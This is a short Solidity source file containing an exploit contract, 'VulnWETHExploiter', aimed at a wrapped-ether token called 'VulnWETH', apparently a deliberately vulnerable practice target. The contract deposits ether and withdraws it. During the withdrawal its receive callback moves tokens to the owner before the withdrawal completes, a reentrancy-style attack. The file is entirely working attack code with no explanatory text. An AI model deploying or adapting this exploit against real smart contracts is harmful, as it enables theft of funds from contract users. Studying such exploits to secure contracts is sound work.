pragma solidity ^0.8.20;

interface IVulnWETH {
    function deposit() external payable;
    function withdraw(uint wad) external;
    function balanceOf(address account) external view returns (uint);
    function transfer(address dst, uint wad) external returns (bool);
}

contract VulnWETHExploiter {
    IVulnWETH vulnWETH;
    address owner;

    constructor(IVulnWETH _vulnWETH) {
        vulnWETH = _vulnWETH;
        owner = msg.sender;
    }

    function exploit() external payable {
        IVulnWETH _vulnWETH = vulnWETH;
        _vulnWETH.deposit{value: msg.value}();
        _vulnWETH.withdraw(_vulnWETH.balanceOf(address(this)));
    }

    receive() external payable {
        IVulnWETH _vulnWETH = vulnWETH;
        if (gasleft() > 4000) {
            _vulnWETH.transfer(owner, 1);
        }
    }
}